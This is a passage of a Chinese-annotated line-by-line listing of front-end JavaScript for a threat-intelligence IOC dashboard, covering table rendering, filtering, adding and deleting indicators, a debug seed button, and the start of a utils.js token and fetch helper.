| 403 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 404 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      e.type.toUpperCase() +` |
| 405 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>";` |
| 406 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const sources = Array.isArray(e.sources) ? e.sources : [];` |
| 407 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const sourceBadges = sources` |
| 408 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      .map((s) => \`<span class="badge badge--source">${escapeHtml(s)}</span>\`)` |
| 409 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join(" ");` |
| 410 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const reason = escapeHtml(e.reason \|\| "");` |
| 411 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const note = escapeHtml(e.note \|\| "");` |
| 412 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const reasonCell = reason + (note ? \`<div class="text-tertiary" style="font-size: var(--fs-caption); margin-top: 2px">${note}</div>\` : "");` |
| 413 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const score = e.score === null \|\| e.score === undefined ? "—" : e.score;` |
| 414 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 415 | 返回结果：把计算值交给调用方。 | `    return \`` |
| 416 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      <tr data-type="${escapeHtml(e.type)}" data-value="${escapeHtml(e.value)}">` |
| 417 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td>${typeBadge}</td>` |
| 418 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td><code class="mono" style="color: var(--info-blue)">${escapeHtml(e.value)}</code></td>` |
| 419 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td>${sourceBadges}</td>` |
| 420 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td class="num">${score}</td>` |
| 421 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td class="num">${e.hits ?? 0}</td>` |
| 422 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td>${reasonCell}</td>` |
| 423 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td class="mono" style="color: var(--text-tertiary); font-size: var(--fs-caption)">${escapeHtml(formatTime(e.added_at))}</td>` |
| 424 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <td>` |
| 425 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <div class="table__actions">` |
| 426 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <button class="btn btn--ghost btn--sm" data-action="query" type="button">查询</button>` |
| 427 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <button class="btn btn--danger btn--sm" data-action="delete" type="button">删除</button>` |
| 428 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          </div>` |
| 429 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        </td>` |
| 430 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      </tr>\`;` |
| 431 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 432 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 433 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindListHandlers() {` |
| 434 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnListTypes.forEach((btn) => {` |
| 435 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", () => {` |
| 436 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.filter.type = btn.dataset.listType \|\| "";` |
| 437 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnListTypes.forEach((b) =>` |
| 438 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", b === btn)` |
| 439 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 440 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        loadList();` |
| 441 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 442 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 443 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.selSource.addEventListener("change", () => {` |
| 444 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.filter.source = el.selSource.value;` |
| 445 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadList();` |
| 446 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 447 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const onSearch = debounce(() => {` |
| 448 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.filter.q = el.inputListQ.value.trim();` |
| 449 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadList();` |
| 450 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }, 250);` |
| 451 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.inputListQ.addEventListener("input", onSearch);` |
| 452 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 453 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnRefresh.addEventListener("click", () => {` |
| 454 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadList();` |
| 455 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadProviders();` |
| 456 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 457 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 458 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.tbody.addEventListener("click", (e) => {` |
| 459 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const btn = e.target.closest("button[data-action]");` |
| 460 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!btn) return;` |
| 461 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const tr = btn.closest("tr");` |
| 462 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const type = tr.dataset.type;` |
| 463 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const value = tr.dataset.value;` |
| 464 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (btn.dataset.action === "delete") {` |
| 465 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        deleteIoc(type, value);` |
| 466 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (btn.dataset.action === "query") {` |
| 467 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.queryType = type;` |
| 468 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnQueryTypes.forEach((b) =>` |
| 469 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", b.dataset.queryType === type)` |
| 470 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 471 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.qValue.value = value;` |
| 472 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        runQuery();` |
| 473 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        document` |
| 474 | DOM 查询：定位页面元素以便读取或更新。 | `          .querySelector(".card")` |
| 475 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          .scrollIntoView({ behavior: "smooth", block: "start" });` |
| 476 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 477 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 478 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 479 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 480 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function deleteIoc(type, value) {` |
| 481 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.confirm(\`确认移除 ${type.toUpperCase()} 「${value}」？\`)) return;` |
| 482 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 483 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      await fetchApi(` |
| 484 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        \`/api/threat_intel/iocs/${encodeURIComponent(type)}/${encodeURIComponent(value)}\`,` |
| 485 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        { method: "DELETE" }` |
| 486 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 487 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast(\`已移除：${value}\`, "info");` |
| 488 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadList();` |
| 489 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 490 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("删除失败：" + (err.message \|\| ""), "error");` |
| 491 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 492 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 493 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 494 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 495 | 注释：说明前端逻辑或交互意图。 | `   * 新增抽屉` |
| 496 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 497 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindDrawer() {` |
| 498 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnNew.addEventListener("click", () => openDrawer());` |
| 499 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.drawerClose.addEventListener("click", closeDrawer);` |
| 500 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.drawerOverlay.addEventListener("click", closeDrawer);` |
| 501 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnCancel.addEventListener("click", closeDrawer);` |
| 502 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.addEventListener("keydown", (e) => {` |
| 503 | 页面更新：修改元素内容、样式或状态。 | `      if (e.key === "Escape" && el.drawer.classList.contains("is-open")) closeDrawer();` |
| 504 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 505 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnSave.addEventListener("click", saveIoc);` |
| 506 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.fType.addEventListener("change", () => {` |
| 507 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.fValue.placeholder =` |
| 508 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.fType.value === "ip" ? "1.2.3.4" : "evil-example.com";` |
| 509 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 510 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 511 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 512 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function openDrawer() {` |
| 513 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    clearForm();` |
| 514 | 页面更新：修改元素内容、样式或状态。 | `    el.drawer.classList.add("is-open");` |
| 515 | 页面更新：修改元素内容、样式或状态。 | `    el.drawerOverlay.classList.add("is-open");` |
| 516 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawer.setAttribute("aria-hidden", "false");` |
| 517 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawerOverlay.setAttribute("aria-hidden", "false");` |
| 518 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    requestAnimationFrame(() => el.fValue.focus());` |
| 519 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 520 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 521 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function closeDrawer() {` |
| 522 | 页面更新：修改元素内容、样式或状态。 | `    el.drawer.classList.remove("is-open");` |
| 523 | 页面更新：修改元素内容、样式或状态。 | `    el.drawerOverlay.classList.remove("is-open");` |
| 524 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawer.setAttribute("aria-hidden", "true");` |
| 525 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawerOverlay.setAttribute("aria-hidden", "true");` |
| 526 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 527 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 528 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function clearForm() {` |
| 529 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fType.value = "ip";` |
| 530 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fValue.value = "";` |
| 531 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fSource.value = "manual";` |
| 532 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fScore.value = "";` |
| 533 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fReason.value = "";` |
| 534 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fNote.value = "";` |
| 535 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.eValue.hidden = true;` |
| 536 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fValue.placeholder = "1.2.3.4";` |
| 537 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 538 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 539 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function saveIoc() {` |
| 540 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const type = el.fType.value;` |
| 541 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const value = el.fValue.value.trim();` |
| 542 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const err = validateValue(type, value);` |
| 543 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.eValue.hidden = true;` |
| 544 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (err) {` |
| 545 | 页面更新：修改元素内容、样式或状态。 | `      el.eValue.textContent = err;` |
| 546 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.eValue.hidden = false;` |
| 547 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.fValue.focus();` |
| 548 | 返回结果：把计算值交给调用方。 | `      return;` |
| 549 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 550 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const payload = {` |
| 551 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      type,` |
| 552 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      value,` |
| 553 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      source: el.fSource.value.trim() \|\| "manual",` |
| 554 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      reason: el.fReason.value.trim(),` |
| 555 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      note: el.fNote.value.trim(),` |
| 556 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 557 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (el.fScore.value !== "") payload.score = parseInt(el.fScore.value, 10);` |
| 558 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 559 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.btnSave.disabled = true;` |
| 560 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 561 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const saved = await fetchApi("/api/threat_intel/iocs", {` |
| 562 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 563 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: payload,` |
| 564 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 565 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast(\`已添加：${saved.value}\`, "info");` |
| 566 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      closeDrawer();` |
| 567 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadList();` |
| 568 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 569 | 页面更新：修改元素内容、样式或状态。 | `      el.eValue.textContent = err.message \|\| "保存失败";` |
| 570 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.eValue.hidden = false;` |
| 571 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } finally {` |
| 572 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.btnSave.disabled = false;` |
| 573 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 574 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 575 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 576 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 577 | 注释：说明前端逻辑或交互意图。 | `   * DEBUG seed` |
| 578 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 579 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function maybeEnableSeedButton() {` |
| 580 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!el.btnSeed) return;` |
| 581 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 582 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const resp = await fetch("/api/alerts/_seed", {` |
| 583 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 584 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        headers: {` |
| 585 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "Content-Type": "application/json",` |
| 586 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          Authorization: "Bearer " + window.AGApi.getToken(),` |
| 587 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 588 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: JSON.stringify({ count: 0 }),` |
| 589 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 590 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (resp.status === 201 \|\| resp.status === 400) {` |
| 591 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.btnSeed.hidden = false;` |
| 592 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 593 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {}` |
| 594 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 595 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 596 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindSeedButton() {` |
| 597 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!el.btnSeed) return;` |
| 598 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnSeed.addEventListener("click", async () => {` |
| 599 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      try {` |
| 600 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const r = await fetchApi("/api/threat_intel/_seed", { method: "POST" });` |
| 601 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast(\`已生成 ${r.created \|\| 0} 条演示 IOC\`, "info");` |
| 602 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        loadList();` |
| 603 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } catch (err) {` |
| 604 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("生成失败：" + (err.message \|\| ""), "error");` |
| 605 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 606 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 607 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 608 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 609 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 610 | 注释：说明前端逻辑或交互意图。 | `   * 启动` |
| 611 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 612 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function init() {` |
| 613 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindQueryHandlers();` |
| 614 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindListHandlers();` |
| 615 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindDrawer();` |
| 616 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindSeedButton();` |
| 617 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 618 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await loadProviders();` |
| 619 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await loadList();` |
| 620 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    maybeEnableSeedButton();` |
| 621 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 622 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 623 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (document.readyState === "loading") {` |
| 624 | 事件绑定：监听用户操作并触发对应处理函数。 | `    document.addEventListener("DOMContentLoaded", init);` |
| 625 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  } else {` |
| 626 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    init();` |
| 627 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 628 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/utils.js`

- 类型：前端静态资源
- 行数：296

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * utils.js — 前端通用工具（Phase 7）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   1. 统一的 \`fetchApi\`：附带 JWT、处理 401/403/429` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   2. Token 读写（localStorage）与跳转登录页` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   3. 简单 toast / 时间格式化 / 安全 HTML 转义` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` * 所有业务页面只应通过本文件暴露的 \`window.AGApi\` / \`window.AGUI\` 访问。` |
| 10 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 11 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 12 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 13 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 14 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const TOKEN_KEY = "ag_access_token";` |
| 15 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const REFRESH_KEY = "ag_refresh_token";` |
| 16 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const USER_KEY = "ag_username";` |
| 17 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 18 | 注释：说明前端逻辑或交互意图。 | `  /* ------------------------- Token 管理 ------------------------- */` |
| 19 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function getToken() {` |
| 20 | 返回结果：把计算值交给调用方。 | `    return localStorage.getItem(TOKEN_KEY) \|\| "";` |
| 21 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 22 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 23 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function getRefreshToken() {` |
| 24 | 返回结果：把计算值交给调用方。 | `    return localStorage.getItem(REFRESH_KEY) \|\| "";` |
| 25 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 26 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 27 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function setTokens({ access_token, refresh_token, username }) {` |
| 28 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (access_token) localStorage.setItem(TOKEN_KEY, access_token);` |
| 29 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (refresh_token) localStorage.setItem(REFRESH_KEY, refresh_token);` |
| 30 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (username) localStorage.setItem(USER_KEY, username);` |
| 31 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 32 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 33 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function clearTokens() {` |
| 34 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    localStorage.removeItem(TOKEN_KEY);` |
| 35 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    localStorage.removeItem(REFRESH_KEY);` |
| 36 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    localStorage.removeItem(USER_KEY);` |
| 37 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 38 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 39 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function getUsername() {` |
| 40 | 返回结果：把计算值交给调用方。 | `    return localStorage.getItem(USER_KEY) \|\| "";` |
| 41 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 42 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 43 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function gotoLogin(message) {` |
| 44 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    clearTokens();` |
| 45 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (message) {` |
| 46 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      sessionStorage.setItem("ag_login_message", message);` |
| 47 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 48 | 注释：说明前端逻辑或交互意图。 | `    // 避免循环跳转` |
| 49 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!location.pathname.endsWith("/login")) {` |
| 50 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      location.href = "/login";` |
| 51 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 52 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 53 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 54 | 注释：说明前端逻辑或交互意图。 | `  /* ------------------------- fetchApi --------------------------- */` |
| 55 | 注释：说明前端逻辑或交互意图。 | `  /**` |
| 56 | 注释：说明前端逻辑或交互意图。 | `   * 统一的 REST 调用封装。` |
| 57 | 注释：说明前端逻辑或交互意图。 | `   * @param {string} path 以 \`/api/\` 开头的路径` |
| 58 | 注释：说明前端逻辑或交互意图。 | `   * @param {{` |
| 59 | 注释：说明前端逻辑或交互意图。 | `   *   method?: string,` |
| 60 | 注释：说明前端逻辑或交互意图。 | `   *   body?: any,` |
| 61 | 注释：说明前端逻辑或交互意图。 | `   *   headers?: Record<string,string>,` |
| 62 | 注释：说明前端逻辑或交互意图。 | `   *   query?: Record<string,any>,` |
| 63 | 注释：说明前端逻辑或交互意图。 | `   *   skipAuth?: boolean,` |
| 64 | 注释：说明前端逻辑或交互意图。 | `   *   returnResponse?: boolean,` |
| 65 | 注释：说明前端逻辑或交互意图。 | `   * }} options` |
| 66 | 注释：说明前端逻辑或交互意图。 | `   * @returns {Promise<any>} 默认返回解析后的 JSON；returnResponse=true 时返回` |
| 67 | 注释：说明前端逻辑或交互意图。 | `   *   \`{data, status, headers}\`（headers 为 Headers 对象）。非 2xx 会 reject Error。` |
| 68 | 注释：说明前端逻辑或交互意图。 | `   */` |
| 69 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function fetchApi(path, options = {}) {` |
| 70 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const {` |
| 71 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      method = "GET",` |
| 72 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      body,` |
| 73 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      headers = {},` |
| 74 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      query,` |
| 75 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      skipAuth = false,` |
| 76 | 返回结果：把计算值交给调用方。 | `      returnResponse = false,` |
| 77 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } = options;` |
| 78 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 79 | 注释：说明前端逻辑或交互意图。 | `    // 查询字符串组装` |
| 80 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let url = path;` |
| 81 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (query && typeof query === "object") {` |
| 82 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const qs = new URLSearchParams();` |
| 83 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      Object.entries(query).forEach(([k, v]) => {` |
| 84 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (v === undefined \|\| v === null \|\| v === "") return;` |
| 85 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        qs.append(k, String(v));` |
| 86 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 87 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const suffix = qs.toString();` |
| 88 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (suffix) url += (url.includes("?") ? "&" : "?") + suffix;` |
| 89 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 90 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 91 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const finalHeaders = { Accept: "application/json", ...headers };` |
| 92 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (body && !(body instanceof FormData)) {` |
| 93 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      finalHeaders["Content-Type"] = "application/json";` |
| 94 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 95 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!skipAuth) {` |
| 96 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const token = getToken();` |
